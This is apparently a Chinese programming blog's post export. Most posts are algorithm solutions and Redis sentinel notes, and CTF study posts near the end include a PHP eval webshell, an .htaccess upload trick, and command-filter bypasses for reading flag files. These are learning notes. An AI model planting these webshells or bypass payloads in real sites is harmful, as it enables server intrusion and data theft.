以整数形式返回满足题目要求的最长子数组的长度。 注意：子数组 是数组中的一个连续非空元素序列。 示例 1： 输入：nums = [3,2,5,4], threshold = 5 输出：3 解释：在这个示例中，我们选择从 l = 1 开始、到 r = 3 结束的子数组 =&gt; [2,5,4] ，满足上述条件。 因此，答案就是这个子数组的长度 3 。可以证明 3 是满足题目要求的最大长度。 示例 2： 输入：nums = [1,2], threshold = 2 输出：1 解释： 在这个示例中，我们选择从 l = 1 开始、到 r = 1 结束的子数组 =&gt; [2] 。 该子数组满足上述全部条件。可以证明 1 是满足题目要求的最大长度。 示例 3： 输入：nums = [2,3,4,5], threshold = 4 输出：3 解释： 在这个示例中，我们选择从 l = 0 开始、到 r = 2 结束的子数组 =&gt; [2,3,4] 。 该子数组满足上述全部条件。 因此，答案就是这个子数组的长度 3 。可以证明 3 是满足题目要求的最大长度。 提示： 1 &lt;= nums.length &lt;= 100 1 &lt;= nums[i] &lt;= 100 1 &lt;= threshold &lt;= 100 思路 题目求区间长度，区间设定了规则，那么用双指针，结合if匹配规则找出最大的区间长度即可。 解题方法 滑动窗口，在条件里满足所有设定规则即可 复杂度 时间复杂度: $O(n)$ 空间复杂度: $O(1)$ Code 12345678910111213141516171819202122232425262728293031323334class Solution &#123; public int longestAlternatingSubarray(int[] nums, int threshold) &#123; int n = nums.length; int ans = Integer.MIN_VALUE; int left = 0, right = 0; while(right &lt; n) &#123; // 先满足 nums[l] % 2 == 0 if (nums[left] % 2 != 0) &#123; while(left &lt; n &amp;&amp; nums[left] %2 != 0) &#123; left++; &#125; right = left; &#125; if (right &gt;= n) break; // 满足 nums[i] &lt;= threshold if (left == right &amp;&amp; nums[right] &lt;= threshold) &#123; ans = Math.max(ans, 1); &#125; if(left == right &amp;&amp; nums[right] &gt; threshold) &#123; right++; left = right; continue; &#125; // 满足 nums[i] % 2 != nums[i + 1] % 2 right++; if(right &lt; n &amp;&amp; (nums[right] % 2 != nums[right-1] % 2) &amp;&amp; nums[right] &lt;= threshold) &#123; ans = Math.max(ans, right - left + 1); &#125; else &#123; left = right; &#125; &#125; return ans != Integer.MIN_VALUE ? ans: 0; &#125;&#125; 632.最小区间 Problem: 632. 最小区间 你有&nbsp;k&nbsp;个 非递减排列 的整数列表。找到一个 最小 区间，使得&nbsp;k&nbsp;个列表中的每个列表至少有一个数包含在其中。 我们定义如果&nbsp;b-a &lt; d-c&nbsp;或者在&nbsp;b-a == d-c&nbsp;时&nbsp;a &lt; c，则区间 [a,b] 比 [c,d] 小。 示例 1： 输入：nums = [[4,10,15,24,26], [0,9,12,20], [5,18,22,30]] 输出：[20,24] 解释： 列表 1：[4, 10, 15, 24, 26]，24 在区间 [20,24] 中。 列表 2：[0, 9, 12, 20]，20 在区间 [20,24] 中。 列表 3：[5, 18, 22, 30]，22 在区间 [20,24] 中。 示例 2： 输入：nums = [[1,2,3],[1,2,3],[1,2,3]] 输出：[1,1] 提示： nums.length == k 1 &lt;= k &lt;= 3500 1 &lt;= nums[i].length &lt;= 50 -105 &lt;= nums[i][j] &lt;= 105 nums[i] 按非递减顺序排列 思路 要求满足区间，可以用左右双指针去找；求每个列表都有一个数满足在区间内，可以用memo数组存储是否满足，当need满足列表长度时为满足所求，然后算出最小区间即可。 解题方法 思路在于把列表内的值都转化为hash映射，把列表都转化为index求是否所有的index都在区间内即可。 Code 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152class Solution &#123; public int[] smallestRange(List&lt;List&lt;Integer&gt;&gt; nums) &#123; // 整体思路：把列表里面的数都映射进hash表，然后用need数组need[nums.length]判断所求的区间是否都满足了每个列表都有一个数在区间内 Map&lt;Integer, List&lt;Integer&gt;&gt; map = new HashMap&lt;&gt;(); int size = nums.size(); // 初始化满足的最小区间，最小值为所有列表里面的值的最小值，最大值为所有列表里面的值的最大值 int minVal = Integer.MAX_VALUE, maxVal = Integer.MIN_VALUE; for(int i = 0; i &lt; size; i++) &#123; for(int x: nums.get(i)) &#123; List&lt;Integer&gt; list = map.getOrDefault(x, new ArrayList&lt;Integer&gt;()); list.add(i); map.put(x, list); minVal = Math.min(minVal, x); maxVal = Math.max(maxVal, x); &#125; &#125; // 滑动窗口从最新值开始滑动 int left = minVal, right = minVal; // 记录是否列表 int[] memo = new int[size]; int need = 0; int bestL = minVal, bestR = maxVal; while(right &lt;= maxVal) &#123; // 如果right在map当中 if(map.containsKey(right)) &#123; for(int x: map.get(right)) &#123; // 记录区间满足了第x个列表 memo[x]++; if (memo[x] == 1) need++; &#125; &#125; // 当所有列表都满足了，记录区间大小，并缩小窗口 while(need == size) &#123; // 缩小区间 if(right - left &lt; bestR - bestL) &#123; bestL = left; bestR = right; &#125; if(map.containsKey(left)) &#123; for(int x: map.get(left)) &#123; if (memo[x] == 1) need--; memo[x]--; &#125; &#125; left++; &#125; right++; &#125; return new int[]&#123;bestL, bestR&#125;; &#125;&#125; 中间向两端扩散指针中间向两端扩散，即左右指针分别朝左右两边扩散，常见为寻找回文子串，判断回文子串的重点为判断子串的长度是奇数还是偶数。 从给定位置寻找回文子串的算法： 1234567891011// 在 s 中寻找以 s[l] 和 s[r] 为中心的最长回文串String palindrome(String s, int l, int r) &#123; // 防止索引越界 while (l &gt;= 0 &amp;&amp; r &lt; s.length() &amp;&amp; s.charAt(l) == s.charAt(r)) &#123; // 双指针，向两边展开 l--; r++; &#125; // 返回以 s[l] 和 s[r] 为中心的最长回文串 return s.substring(l + 1, r);&#125; 然后寻找给定字符串的最长回文子串： 12345678910111213String longestPalindrome(String s) &#123; String res = &quot;&quot;; for (int i = 0; i &lt; s.length(); i++) &#123; // 以 s[i] 为中心的最长回文子串 String s1 = palindrome(s, i, i); // 以 s[i] 和 s[i+1] 为中心的最长回文子串 String s2 = palindrome(s, i, i + 1); // res = longest(res, s1, s2) res = res.length() &gt; s1.length() ? res : s1; res = res.length() &gt; s2.length() ? res : s2; &#125; return res;&#125;","categories":[{"name":"计算机算法","slug":"计算机算法","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"},{"name":"双指针","slug":"计算机算法/双指针","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E5%8F%8C%E6%8C%87%E9%92%88/"}],"tags":[{"name":"滑动窗口","slug":"滑动窗口","permalink":"https://blog.zhengxiangling.com/tags/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/"}],"author":"Elijah Zheng"},{"title":"链表的逻辑相关，寻找倒数第 K 个节点、寻找中间位置、判断是否有环、判断两个链表是否相交等","slug":"链表的逻辑相关，寻找链表倒数第-K-个节点、寻找链表中间位置、判断链表是否有环、判断两个链表是否相交","date":"2023-10-13T08:10:00.000Z","updated":"2023-11-17T14:27:30.012Z","comments":true,"path":"2023/10/13/链表的逻辑相关，寻找链表倒数第-K-个节点、寻找链表中间位置、判断链表是否有环、判断两个链表是否相交/","link":"","permalink":"https://blog.zhengxiangling.com/2023/10/13/%E9%93%BE%E8%A1%A8%E7%9A%84%E9%80%BB%E8%BE%91%E7%9B%B8%E5%85%B3%EF%BC%8C%E5%AF%BB%E6%89%BE%E9%93%BE%E8%A1%A8%E5%80%92%E6%95%B0%E7%AC%AC-K-%E4%B8%AA%E8%8A%82%E7%82%B9%E3%80%81%E5%AF%BB%E6%89%BE%E9%93%BE%E8%A1%A8%E4%B8%AD%E9%97%B4%E4%BD%8D%E7%BD%AE%E3%80%81%E5%88%A4%E6%96%AD%E9%93%BE%E8%A1%A8%E6%98%AF%E5%90%A6%E6%9C%89%E7%8E%AF%E3%80%81%E5%88%A4%E6%96%AD%E4%B8%A4%E4%B8%AA%E9%93%BE%E8%A1%A8%E6%98%AF%E5%90%A6%E7%9B%B8%E4%BA%A4/","excerpt":"本章主要介绍链表相关的逻辑操作，包括寻找倒数第 K 个节点、寻找中间位置、判断是否有环、判断两个链表是否相交等。","text":"本章主要介绍链表相关的逻辑操作，包括寻找倒数第 K 个节点、寻找中间位置、判断是否有环、判断两个链表是否相交等。 寻找倒数第 K 个节点链表不同于数组，一开始并不知道长度，可通过找数据规律求解，如链表长度为 n，倒数第 K 个节点转化过来即为顺数第 n-K+1 个节点，可通过先遍历整个链表得出长度 n，再第二次遍历到n-K+1得到寻找节点。 但是上述需要循环两次遍历。 我们也可以通过一次遍历来实现（最优解）。运用双指针，指针 p1 从头结点先走 k 步，距离末尾空指针还剩 n-k 步，此时让 p2 指向链表头结点，p1 和 p2 同时走 n-k 步，此时 p2 在链尾 null，p1 正好在顺数第 n-K+1 个节点，即为倒数第 K 个节点，即为所求，算法如下： 1234567891011121314151617// 返回链表的倒数第 k 个节点ListNode findFromEnd(ListNode head, int k) &#123; ListNode p1 = head; // p1 先走 k 步 for (int i = 0; i &lt; k; i++) &#123; p1 = p1.next; &#125; ListNode p2 = head; // p1 和 p2 同时走 n - k 步 while (p1 != null) &#123; p2 = p2.next; p1 = p1.next; &#125; // p2 现在指向第 n - k + 1 个节点，即倒数第 k 个节点 return p2;&#125; 寻找链表中间位置常规做法，我们先遍历整个链表寻找长度 n，然后在遍历 n/2寻找中间位置。 但是最优解可以通过一次循环来实现。 运用 快慢指针 的思想，让两个指针 slow fast 同时从头结点出发， slow 走一步,fast 走两步，当 fast 为空或者 fast 的下一节点为空，slow 则走到了中点位置，即为所求。算法如下： 123456789101112ListNode middleNode(ListNode head) &#123; // 快慢指针初始化指向 head ListNode slow = head, fast = head; // 快指针走到末尾时停止 while (fast != null &amp;&amp; fast.next != null) &#123; // 慢指针走一步，快指针走两步 slow = slow.next; fast = fast.next.next; &#125; // 慢指针指向中点 return slow;&#125; 判断链表是否有环思想也为运用 快慢指针，让两个指针 slow fast 同时从头结点出发， slow 走一步,fast 走两步，如果两个指针相遇在同一位置，则证明有环；当 fast 为空或者 fast 的下一节点为空，则证明没有环，算法如下： 12345678910111213141516boolean hasCycle(ListNode head) &#123; // 快慢指针初始化指向 head ListNode slow = head, fast = head; // 快指针走到末尾时停止 while (fast != null &amp;&amp; fast.next != null) &#123; // 慢指针走一步，快指针走两步 slow = slow.next; fast = fast.next.next; // 快慢指针相遇，说明含有环 if (slow == fast) &#123; return true; &#125; &#125; // 不包含环 return false;&#125; 判断两个链表是否相交，并返回相交节点此解法我们可以做如下模拟，其中两个链表相交的点为 3链表1 1,3,5,6,7, 链表2 2,3,4,8,9, ,然后把链表拼接如下 链表1 + 链表2 &#x3D; 1,3,5,6,7,2,3,4,8,9 链表2 + 链表1 &#x3D; 2,3,4,8,9,1,3,5,6,7 可以看出两条链表拼接之后，用两个指针分别同时前进，遇到相遇时，该节点即为相交节点。算法如下： 1234567891011121314ListNode getIntersectionNode(ListNode headA, ListNode headB) &#123; // p1 指向 A 链表头结点，p2 指向 B 链表头结点 ListNode p1 = headA, p2 = headB; while (p1 != p2) &#123; // p1 走一步，如果走到 A 链表末尾，转到 B 链表 if (p1 == null) p1 = headB; else p1 = p1.next; // p2 走一步，如果走到 B 链表末尾，转到 A 链表 if (p2 == null) p2 = headA; else p2 = p2.next; &#125; return p1;&#125;","categories":[{"name":"计算机算法","slug":"计算机算法","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"},{"name":"链表","slug":"计算机算法/链表","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E9%93%BE%E8%A1%A8/"}],"tags":[{"name":"快慢指针","slug":"快慢指针","permalink":"https://blog.zhengxiangling.com/tags/%E5%BF%AB%E6%85%A2%E6%8C%87%E9%92%88/"}],"author":"Elijah Zheng"},{"title":"No.23 合并 K 个升序链表","slug":"o-23-合并-K-个链表","date":"2023-10-11T11:46:00.000Z","updated":"2023-11-17T14:27:30.006Z","comments":true,"path":"2023/10/11/o-23-合并-K-个链表/","link":"","permalink":"https://blog.zhengxiangling.com/2023/10/11/o-23-%E5%90%88%E5%B9%B6-K-%E4%B8%AA%E9%93%BE%E8%A1%A8/","excerpt":"困难等级。 给你一个链表数组，每个链表都已经按升序排列。请你将所有链表合并到一个升序链表中，返回合并后的链表。","text":"困难等级。 给你一个链表数组，每个链表都已经按升序排列。请你将所有链表合并到一个升序链表中，返回合并后的链表。 123456789101112131415161718192021222324252627示例 1：输入：lists = [[1,4,5],[1,3,4],[2,6]]输出：[1,1,2,3,4,4,5,6]解释：链表数组如下：[ 1-&gt;4-&gt;5, 1-&gt;3-&gt;4, 2-&gt;6]将它们合并到一个有序链表中得到。1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4-&gt;5-&gt;6示例 2：输入：lists = []输出：[]示例 3：输入：lists = [[]]输出：[] 提示：k == lists.length0 &lt;= k &lt;= 10^40 &lt;= lists[i].length &lt;= 500-10^4 &lt;= lists[i][j] &lt;= 10^4lists[i] 按 升序 排列lists[i].length 的总和不超过 10^4 思路 我们想要一个从小到大的升序链表，即每次循环都取出一个最小的节点，然后依次连接，则得到一个升序的链表。 难点在于如何在 K 个链表中拿到一个最小的节点。 运用优先队列-小根堆的思想，堆顶得到的永远是最小值。我们可以先遍历所有链表，把每个链表的头结点入堆，即可得到第一个最小的节点（堆顶），然后取出最小节点的下一节点入堆排序，循环取出堆顶，依次连接即可得到一条升序链表。 技术栈： 优先队列 PriorityQueue&lt;ListNode&gt; pq = new PriorityQueue&lt;&gt;(length, (a, b) -&gt; (a.val - b.val)); , 小根堆就设置 a.val - b.val 加入队列 pq.add(node) 堆顶出列 pq.poll() 判断堆是否为空 pq.isEmpty() 解法12345678910111213141516171819202122232425262728293031323334353637/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode() &#123;&#125; * ListNode(int val) &#123; this.val = val; &#125; * ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125; * &#125; */class Solution &#123; public ListNode mergeKLists(ListNode[] lists) &#123; if (lists.length == 0) return null; // 虚拟头节点 ListNode dummy = new ListNode(-1), p = dummy; // 运用优先队列-小根堆的思想，根节点始终保持最小值 PriorityQueue&lt;ListNode&gt; pq = new PriorityQueue&lt;&gt;(lists.length, (a,b) -&gt; (a.val - b.val)); // 因为链表数组已经排序，先将链表数组内的头节点全部存入小根堆中 for(ListNode head:lists) &#123; // 如果链表非空，则入堆 if(head != null) pq.add(head); &#125; // 循环将链表的节点入堆，然后每次取出堆顶节点，则得到升序链表 while(!pq.isEmpty()) &#123; // 堆顶出列 ListNode minNode = pq.poll(); p.next = minNode; // 如果堆顶节点还有后续节点，则入堆排序 if (minNode.next != null) &#123; pq.add(minNode.next); &#125; // p 往下走 p = p.next; &#125; return dummy.next; &#125;&#125;","categories":[{"name":"计算机算法","slug":"计算机算法","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"},{"name":"链表","slug":"计算机算法/链表","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E9%93%BE%E8%A1%A8/"},{"name":"堆","slug":"计算机算法/链表/堆","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E9%93%BE%E8%A1%A8/%E5%A0%86/"}],"tags":[{"name":"二叉堆","slug":"二叉堆","permalink":"https://blog.zhengxiangling.com/tags/%E4%BA%8C%E5%8F%89%E5%A0%86/"}],"author":"Elijah Zheng"},{"title":"No.86 分割链表","slug":"6-分割链表","date":"2023-10-11T01:45:00.000Z","updated":"2023-11-17T14:27:30.000Z","comments":true,"path":"2023/10/11/6-分割链表/","link":"","permalink":"https://blog.zhengxiangling.com/2023/10/11/6-%E5%88%86%E5%89%B2%E9%93%BE%E8%A1%A8/","excerpt":"中等题目。 给你一个链表的头节点 head 和一个特定值 x ，请你对链表进行分隔，使得所有 小于 x 的节点都出现在 大于或等于 x 的节点之前。 你应当 保留 两个分区中每个节点的初始相对位置。","text":"中等题目。 给你一个链表的头节点 head 和一个特定值 x ，请你对链表进行分隔，使得所有 小于 x 的节点都出现在 大于或等于 x 的节点之前。 你应当 保留 两个分区中每个节点的初始相对位置。 示例 1： 123456789101112输入：head = [1,4,3,2,5,2], x = 3输出：[1,2,2,4,3,5]示例 2：输入：head = [2,1], x = 2输出：[1,2] 提示：链表中节点的数目在范围 [0, 200] 内-100 &lt;= Node.val &lt;= 100-200 &lt;= x &lt;= 200 思路本题为单链表，关键点为虚拟头节点和断开原链表节点的next指针防止成环。新建两条链表，把小于x的节点放在链表1，大于等于x的放在链表2，然后合并链表。 解法123456789101112131415161718192021222324252627282930313233343536/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode() &#123;&#125; * ListNode(int val) &#123; this.val = val; &#125; * ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125; * &#125; */class Solution &#123; public ListNode partition(ListNode head, int x) &#123; // 虚拟头节点 ListNode dummy1 = new ListNode(-1), dummy2 = new ListNode(-1), p1 = dummy1, p2 = dummy2; ListNode p = head; while(p != null) &#123; if (p.val &lt; x) &#123; p1.next = p; p1 = p1.next; &#125; else &#123; p2.next = p; p2 = p2.next; &#125; // 断开链 ListNode tmp = p.next; p.next = null; p = tmp; &#125; p1.next = dummy2.next; return dummy1.next; &#125;&#125;","categories":[{"name":"计算机算法","slug":"计算机算法","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"},{"name":"链表","slug":"计算机算法/链表","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E9%93%BE%E8%A1%A8/"}],"tags":[{"name":"单链表","slug":"单链表","permalink":"https://blog.zhengxiangling.com/tags/%E5%8D%95%E9%93%BE%E8%A1%A8/"}],"author":"Elijah Zheng"},{"title":"github稳定访问工具","slug":"github稳定访问工具","date":"2023-10-11T01:35:00.000Z","updated":"2023-11-17T14:27:30.004Z","comments":true,"path":"2023/10/11/github稳定访问工具/","link":"","permalink":"https://blog.zhengxiangling.com/2023/10/11/github%E7%A8%B3%E5%AE%9A%E8%AE%BF%E9%97%AE%E5%B7%A5%E5%85%B7/","excerpt":"","text":"目前在用稳定工具，FastGithub 源地址","categories":[{"name":"分享","slug":"分享","permalink":"https://blog.zhengxiangling.com/categories/%E5%88%86%E4%BA%AB/"}],"tags":[],"author":"Elijah Zheng"},{"title":"No.3 无重复字符的最长字串","slug":"-无重复字符的最长字串","date":"2023-10-10T02:04:00.000Z","updated":"2023-11-17T14:27:30.000Z","comments":true,"path":"2023/10/10/-无重复字符的最长字串/","link":"","permalink":"https://blog.zhengxiangling.com/2023/10/10/-%E6%97%A0%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6%E7%9A%84%E6%9C%80%E9%95%BF%E5%AD%97%E4%B8%B2/","excerpt":"中等题目 给定一个字符串 s ，请你找出其中不含有重复字符的 最长子串 的长度。","text":"中等题目 给定一个字符串 s ，请你找出其中不含有重复字符的 最长子串 的长度。 1234567891011121314151617181920示例 1:输入: s = &quot;abcabcbb&quot;输出: 3 解释: 因为无重复字符的最长子串是 &quot;abc&quot;，所以其长度为 3。示例 2:输入: s = &quot;bbbbb&quot;输出: 1解释: 因为无重复字符的最长子串是 &quot;b&quot;，所以其长度为 1。示例 3:输入: s = &quot;pwwkew&quot;输出: 3解释: 因为无重复字符的最长子串是 &quot;wke&quot;，所以其长度为 3。 请注意，你的答案必须是 子串 的长度，&quot;pwke&quot; 是一个子序列，不是子串。 提示：0 &lt;= s.length &lt;= 5 * 10^4 s 由英文字母、数字、符号和空格组成 最开始解法初步判断为滑动窗口，记录最长字串和最长长度，然后不断右移和缩动窗口 技术栈：字符串分割 String.substring(prev, last) 123456789101112131415161718class Solution &#123; public int lengthOfLongestSubstring(String s) &#123; String subs = &quot;&quot;; int ans = 0; for (int i=0;i&lt;s.length();i++) &#123; char c = s.charAt(i); int findIndex = subs.indexOf(String.valueOf(c)); if (findIndex == -1) &#123; subs += c; ans = Math.max(ans, subs.length()); &#125; else &#123; ans = Math.max(ans, subs.length()); subs = subs.substring(findIndex + 1, subs.length()) + c; &#125; &#125; return ans; &#125;&#125; 时间 12ms 使用滑动窗口框架解法使用hash记录字符出现次数，出现重复字符则滑动 1234567891011121314151617181920212223class Solution &#123; public int lengthOfLongestSubstring(String s) &#123; Map&lt;Character, Integer&gt; window = new HashMap&lt;&gt;(); int left = 0, right = 0; int ans = 0; while (right &lt; s.length()) &#123; char c = s.charAt(right); right++; window.put(c, window.getOrDefault(c, 0) + 1); while (window.get(c) &gt; 1) &#123; char lc = s.charAt(left); left ++; window.put(lc, window.get(lc) -1); &#125; ans = Math.max(ans, right - left); &#125; return ans; &#125;&#125; 时间 6ms","categories":[{"name":"计算机算法","slug":"计算机算法","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"},{"name":"滑动窗口","slug":"计算机算法/滑动窗口","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/"}],"tags":[{"name":"滑动窗口","slug":"滑动窗口","permalink":"https://blog.zhengxiangling.com/tags/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/"}],"author":"Elijah Zheng"},{"title":"redis哨兵模式启动和异常排查","slug":"redis哨兵模式启动和异常排查","date":"2023-02-13T07:34:00.000Z","updated":"2023-11-17T14:27:30.006Z","comments":true,"path":"2023/02/13/redis哨兵模式启动和异常排查/","link":"","permalink":"https://blog.zhengxiangling.com/2023/02/13/redis%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F%E5%90%AF%E5%8A%A8%E5%92%8C%E5%BC%82%E5%B8%B8%E6%8E%92%E6%9F%A5/","excerpt":"当 redis 使用3台以上服务器组成一个集群时，会涉及到哨兵模式的配置，如何配置哨兵模式以及如何配置参数我们这里不做阐述，只对相关启动命令和排查哨兵模式状态是否正常做说明。","text":"当 redis 使用3台以上服务器组成一个集群时，会涉及到哨兵模式的配置，如何配置哨兵模式以及如何配置参数我们这里不做阐述，只对相关启动命令和排查哨兵模式状态是否正常做说明。 常用涉及redis哨兵模式的命令1.查看哨兵模式状态假设系统集群中的三台服务器为 x.x.60.11、x.x.60.12、x.x.60.13,其中60.12为集群主机 1./redis-cli -h 当前服务器ip地址 -p 26379 INFO 查看哨兵模式状态的别名是否正确，状态（status）是否ok，address是否指向x.x.60.12，如果都正常则无异常。 2.查看进程中 redis 的服务1ps -ef | grep redis 正常情况下会存在两个进程 123UID PID PPID C STIME TTY TIME CMDzheng 6788 0 0 00:00 pts/0 00:00:00 redis-serverzheng 6789 0 0 00:00 pts/0 00:00:00 redis-sentinel 3.关闭哨兵模式服务1kill -9 6788 6789 #上述的进程号 4.启动服务12./redis-server redis.conf./redis-sentinel sentinel.conf 排查 redis 哨兵模式异常情况1.检查哨兵模式状态ps：ip 地址分别更改为三台服务器的地址 1./redis-cli -h 当前服务器ip地址 -p 26379 INFO 如果某台服务器status为odown，或者address指向不为x.x.60.12,则说明集群出现问题，需要重启集群。 2.检查哨兵模式配置文件是否正常12# 查看每台服务器的 sentinel.conf 配置文件vi sentinel.conf 查看 sentinel monitor redismaster &quot;ip地址&quot; 6379 0,检查 ip 地址是否为主机地址，如果不为该值则说明sentinel 有误，在 redis 的服务都暂时的情况下再修改配置文件，修改该ip地址为主机地址，然后保存。 排查完如上问题，重启服务启动顺序，** 优先启动主机的服务 ** 12# 先启动主机的 redis./redis-server redis.conf 然后再启动从机的 redis 然后再启动哨兵模式 12# 先启动主机的 sentinel./redis-sentinel sentinel.conf 然后再启动从机的 sentinel 查询状态在三台服务器中输入 ps -ef | grep redis，如果存在两个 redis 进程则说明应用启动正常。然后分别在三台服务器输入 ./redis-cli -h 当前服务器ip地址 -p 26379 INFO，如果别名、状态、指向地址都正确，则说明哨兵模式正常。 然后可以通过应用验证 redis 是否恢复完毕。","categories":[{"name":"服务器","slug":"服务器","permalink":"https://blog.zhengxiangling.com/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"爬坑","slug":"服务器/爬坑","permalink":"https://blog.zhengxiangling.com/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8/%E7%88%AC%E5%9D%91/"}],"tags":[{"name":"redis","slug":"redis","permalink":"https://blog.zhengxiangling.com/tags/redis/"}],"author":"Elijah Zheng"},{"title":"CTF - 文件上传","slug":"CTF-文件上传","date":"2021-07-21T01:21:00.000Z","updated":"2023-11-17T14:27:30.001Z","comments":true,"path":"2021/07/21/CTF-文件上传/","link":"","permalink":"https://blog.zhengxiangling.com/2021/07/21/CTF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","excerpt":"文件上传分为前端验证和后端验证，前端校验即 js 方式的校验，可通过抓包方式绕过；后端校验是服务器端校验，需上传指定格式文件然后通过指定手段输出文件指令。","text":"文件上传分为前端验证和后端验证，前端校验即 js 方式的校验，可通过抓包方式绕过；后端校验是服务器端校验，需上传指定格式文件然后通过指定手段输出文件指令。 黑名单 白名单 黑名单：不允许我上传什么样的文件 php | html 白名单：仅允许我们上传什么样的文件 png | jpg | gif 前端校验式文件上传如果是前端请求被拦截，使用 burpsuit，直接修改文件格式为 .php,修改内容为一句话木马 &lt;?php eval($POST[&#39;xxx&#39;];)?&gt;，然后访问对应 php 文件，发送 post 请求加上参数。通过参数执行指令 xxx=system(&#39;ls&#39;)，执行命令找到 flag 然后 tac 输出。 后端校验当前目录 301 302 跳转，判断该目录下的文件解析类型 包含ccc 123&lt;FilesMatch &quot;filename&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 文件类型 . .asd .htaccess 上传上面类型的文件，然后就可以上传对应 filename 后缀的文件了","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.zhengxiangling.com/categories/CTF/"}],"tags":[],"author":"Elijah Zheng"},{"title":"CTF - 代码执行","slug":"CTF-代码执行","date":"2021-07-20T08:29:00.000Z","updated":"2023-11-17T14:27:30.001Z","comments":true,"path":"2021/07/20/CTF-代码执行/","link":"","permalink":"https://blog.zhengxiangling.com/2021/07/20/CTF-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","excerpt":"代码执行类的题目，如在指定时间内计算给定方程的数值，方程题一般时间人工计算会超时，只能通过抓取页面内的方程，然后通过代码执行的方式计算好然后提交来解决；或给定一串 php 代码，通过指定变量输入系统指令执行代码获取目录和读取 flag 里的内容。","text":"代码执行类的题目，如在指定时间内计算给定方程的数值，方程题一般时间人工计算会超时，只能通过抓取页面内的方程，然后通过代码执行的方式计算好然后提交来解决；或给定一串 php 代码，通过指定变量输入系统指令执行代码获取目录和读取 flag 里的内容。 获取页面信息包 1.quests包 pip install获取，获取页面信息包 12sess = requests.session()req = sess.get(url) 2.通过 re 正则表达式截取内容，通过(.) 即 (.?)匹配 12pattern = &quot;the answer is:(.*)&lt;/br&gt; a=(.*)&lt;/br&gt; b=(.*?)&lt;/br&gt;&quot;result = re.search(pattern, req.text) 3.然后可获取匹配到值，通过eval()函数计算数值 123456a, b = int(result.group(2)), int(result.group(3))result = eval(result.group(1))4.通过post发送请求获取 答案data = &#123; &#x27;answer&#x27;: result &#125;rsp = sess.post(url, data=data)print(rsp.text) 命令执行如给定一串代码， 1234&lt;?php$a = &#x27;assert&#x27;;$a($_POST[&#x27;a&#x27;]);?&gt; 然后通过发送 post 请求传参，传入 phpinfo() 或者系统命令执行相关命令来获取 flag。 linux中，&amp;和&amp;&amp;,|和||的区别 &amp; 表示任务在后台执行，如要在后台运行 redis-server,则有 redis-server &amp; &amp;&amp; 表示前一条命令执行成功时，才执行后一条命令 ，如 echo &#39;1‘ &amp;&amp; echo &#39;2&#39; | 表示管道，上一条命令的输出，作为下一条命令参数，如 echo &#39;yes&#39; | wc -l || 表示上一条命令执行失败后，才执行下一条命令，如 cat nofile || echo &quot;fail&quot; | 被过滤 用换行符 %0a 空格绕过技巧命令执行时，后台函数可能会过滤掉空格等特殊字符，可通过如下方式绕过过滤 ${IFS} &lt; &lt;&gt; %09 {cat, 1.txt} .\\ %CommonProgramFilesL~10,1% 判断服务器为linux或windows windows 对大小写不敏感，将 x 改为 X，如果不变，则为 windows windows 查看文件使用指令 type, 文件名绕过技巧如 flag 文件被绕过，可通过如下方法绕过 nl / fl``ag, nl / fl[a-z]g, a=fl;b=ag;nl /$a%b echo base64字符串 | base64 -d 通过 base64 加密后再解密 echo cat /flag|base64，echo base64字符串 | base64 -d 通过 base64 加密后再解密","categories":[],"tags":[],"author":"Elijah Zheng"},{"title":"CTF -  sql注入","slug":"CTF-sql注入","date":"2021-07-20T07:26:00.000Z","updated":"2023-11-17T14:27:30.000Z","comments":true,"path":"2021/07/20/CTF-sql注入/","link":"","permalink":"https://blog.zhengxiangling.com/2021/07/20/CTF-sql%E6%B3%A8%E5%85%A5/","excerpt":"sql 注入的题目，出现在登录、注册、查询信息类的题目，涉及前端、后端、数据库（mysql）等知识点。","text":"sql 注入的题目，出现在登录、注册、查询信息类的题目，涉及前端、后端、数据库（mysql）等知识点。 sql注入类别分为：联合注入、报错注入、布尔盲注、时间盲注。 联合盲注联合盲注即通过找注入点，然后通过 union 联合查询语句找到数据库中想要的值，联合查询即保证和前面的select语句有相同字段数，判断select 语句的字段数，order by 判断字段数，查找有多少个库，有多少个表，有什么字段。 1.判断是否有注入点 